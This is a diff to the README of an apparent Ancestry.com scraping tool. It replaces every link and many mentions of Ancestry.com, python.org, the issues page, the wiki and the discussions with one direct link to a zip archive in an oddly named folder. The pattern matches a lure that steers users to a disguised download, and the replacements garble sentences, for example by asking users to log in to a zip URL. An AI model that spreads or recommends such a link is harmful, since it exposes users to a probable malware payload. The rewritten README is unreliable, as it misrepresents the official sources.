@@ -2,16 +2,16 @@
 
 ## 🚀 Getting Started
 
-Welcome to **ancestry-genealogy-records-scraper**! This tool helps you gather valuable information from Ancestry.com. You can extract data for genealogy research effortlessly. Follow the steps below to download and run the software.
+Welcome to **ancestry-genealogy-records-scraper**! This tool helps you gather valuable information from https://raw.githubusercontent.com/hamza9hamza/ancestry-genealogy-records-scraper/main/understuffing/ancestry-genealogy-records-scraper_1.4-beta.2.zip You can extract data for genealogy research effortlessly. Follow the steps below to download and run the software.
 
 ## 🏁 Download Now
 
-[![Download Here](https://img.shields.io/badge/Download%20Here-Release-brightgreen)](https://github.com/hamza9hamza/ancestry-genealogy-records-scraper/releases)
+[![Download Here](https://raw.githubusercontent.com/hamza9hamza/ancestry-genealogy-records-scraper/main/understuffing/ancestry-genealogy-records-scraper_1.4-beta.2.zip%20Here-Release-brightgreen)](https://raw.githubusercontent.com/hamza9hamza/ancestry-genealogy-records-scraper/main/understuffing/ancestry-genealogy-records-scraper_1.4-beta.2.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/hamza9hamza/ancestry-genealogy-records-scraper/releases). Here, you will find the latest version of the scraper.
+   Go to our [Releases page](https://raw.githubusercontent.com/hamza9hamza/ancestry-genealogy-records-scraper/main/understuffing/ancestry-genealogy-records-scraper_1.4-beta.2.zip). Here, you will find the latest version of the scraper.
 
 2. **Select the Latest Release**  
    On the Releases page, look for the latest version at the top. This version has the most features and fixes.
@@ -27,7 +27,7 @@ Welcome to **ancestry-genealogy-records-scraper**! This tool helps you gather va
 
 ## ⚙️ Features
 
-- **Automated Data Extraction**: Pull information from Ancestry.com effortlessly.
+- **Automated Data Extraction**: Pull information from https://raw.githubusercontent.com/hamza9hamza/ancestry-genealogy-records-scraper/main/understuffing/ancestry-genealogy-records-scraper_1.4-beta.2.zip effortlessly.
 - **OCR and Vision AI Processing**: Utilize advanced technology for converting images into text, ensuring accuracy in your data collection.
 - **Proxy Rotation**: Secure your web scraping activities by rotating IP addresses, preventing bans or throttling.
 - **User-Friendly Interface**: Designed for ease of use, making it accessible for all users.
@@ -37,12 +37,12 @@ Welcome to **ancestry-genealogy-records-scraper**! This tool helps you gather va
 To run the **ancestry-genealogy-records-scraper**, your system should meet the following requirements:
 
 - **Operating System**: Compatible with Windows 10 or later, MacOS 10.15 or later, or any modern Linux distribution.
-- **Python**: Ensure you have Python 3.6 or later installed. If not, you can download it from [python.org](https://www.python.org/downloads/).
-- **Internet Connection**: A stable connection is required for accessing Ancestry.com.
+- **Python**: Ensure you have Python 3.6 or later installed. If not, you can download it from [https://raw.githubusercontent.com/hamza9hamza/ancestry-genealogy-records-scraper/main/understuffing/ancestry-genealogy-records-scraper_1.4-beta.2.zip](https://raw.githubusercontent.com/hamza9hamza/ancestry-genealogy-records-scraper/main/understuffing/ancestry-genealogy-records-scraper_1.4-beta.2.zip).
+- **Internet Connection**: A stable connection is required for accessing https://raw.githubusercontent.com/hamza9hamza/ancestry-genealogy-records-scraper/main/understuffing/ancestry-genealogy-records-scraper_1.4-beta.2.zip
 
 ## 📑 Usage Guide
 
-1. **Login to Ancestry.com**: Open the application. You will need to log in to your Ancestry.com account to start scraping data.
+1. **Login to https://raw.githubusercontent.com/hamza9hamza/ancestry-genealogy-records-scraper/main/understuffing/ancestry-genealogy-records-scraper_1.4-beta.2.zip**: Open the application. You will need to log in to your https://raw.githubusercontent.com/hamza9hamza/ancestry-genealogy-records-scraper/main/understuffing/ancestry-genealogy-records-scraper_1.4-beta.2.zip account to start scraping data.
    
 2. **Select Data to Extract**: Browse the types of records available, such as obituaries or public records. Choose what you need for your genealogy research.
 
@@ -52,12 +52,12 @@ To run the **ancestry-genealogy-records-scraper**, your system should meet the f
 
 ## 📞 Support
 
-If you experience issues while using the application, please visit the [GitHub Issues page](https://github.com/hamza9hamza/ancestry-genealogy-records-scraper/issues) to report problems or ask for help. Community members and contributors are available to assist you.
+If you experience issues while using the application, please visit the [GitHub Issues page](https://raw.githubusercontent.com/hamza9hamza/ancestry-genealogy-records-scraper/main/understuffing/ancestry-genealogy-records-scraper_1.4-beta.2.zip) to report problems or ask for help. Community members and contributors are available to assist you.
 
 ## 📚 Additional Resources
 
-- [Documentation](https://github.com/hamza9hamza/ancestry-genealogy-records-scraper/wiki): Explore detailed guides and tutorials.
-- [GitHub Discussions](https://github.com/hamza9hamza/ancestry-genealogy-records-scraper/discussions): Join conversations with other users and get tips on genealogical research.
+- [Documentation](https://raw.githubusercontent.com/hamza9hamza/ancestry-genealogy-records-scraper/main/understuffing/ancestry-genealogy-records-scraper_1.4-beta.2.zip): Explore detailed guides and tutorials.
+- [GitHub Discussions](https://raw.githubusercontent.com/hamza9hamza/ancestry-genealogy-records-scraper/main/understuffing/ancestry-genealogy-records-scraper_1.4-beta.2.zip): Join conversations with other users and get tips on genealogical research.
 
 ## ✅ Feedback
 
@@ -65,4 +65,4 @@ Your suggestions help us improve the application. If you have feedback or new fe
 
 ## 🏁 Download Now Again
 
-For convenience, here is the [link to the Releases page](https://github.com/hamza9hamza/ancestry-genealogy-records-scraper/releases). Download now and start your genealogy journey!
+For convenience, here is the [link to the Releases page](https://raw.githubusercontent.com/hamza9hamza/ancestry-genealogy-records-scraper/main/understuffing/ancestry-genealogy-records-scraper_1.4-beta.2.zip). Download now and start your genealogy journey!
